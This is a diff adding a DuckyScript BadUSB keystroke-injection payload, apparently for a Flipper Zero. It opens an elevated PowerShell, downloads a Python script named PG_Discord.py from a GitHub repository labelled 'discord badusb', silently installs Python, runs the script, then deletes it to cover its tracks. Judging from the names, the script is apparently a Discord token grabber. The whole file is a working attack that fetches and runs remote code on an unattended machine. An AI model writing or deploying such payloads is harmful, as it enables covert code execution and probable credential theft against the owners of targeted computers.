@@ -1,0 +1,39 @@
+REM Opens powershell in admin
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+CTRL SHIFT ENTER
+
+REM downloads PG_Discord.py
+DELAY 1000
+STRING $desktop=Join-Path $env:USERPROFILE "Desktop"; Invoke-RestMethod -Uri "https://raw.githubusercontent.com/MrLeoDaVinci/Leo-flipper-scripts/main/discord%20badusb/PG_Disocrd.py" -OutFile (Join-Path $desktop "PG_Discord.py")
+DELAY 1000
+ENTER
+DELAY 5000
+
+REM installs python 3.10.0
+DELAY 1000
+STRING Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe" -OutFile "$env:TEMP\python310.exe"; Start-Process -FilePath "$env:TEMP\python310.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
+DELAY 1000
+ENTER
+DELAY 90000
+
+REM runs PG_Discord.py
+STRING Set-Location -Path (Join-Path $env:USERPROFILE "Desktop")
+DELAY 1000 
+ENTER
+DELAY 1000
+STRING python PG_Discord.py
+DELAY 1000
+ENTER
+
+REM removed PG_Discord.py and exits powershell
+DELAY 15000
+STRING Remove-Item -Path (Join-Path $env:USERPROFILE "Desktop\PG_Discord.py") -Force
+ENTER
+DELAY 1000
+STRING exit
+DELAY 1000
+ENTER
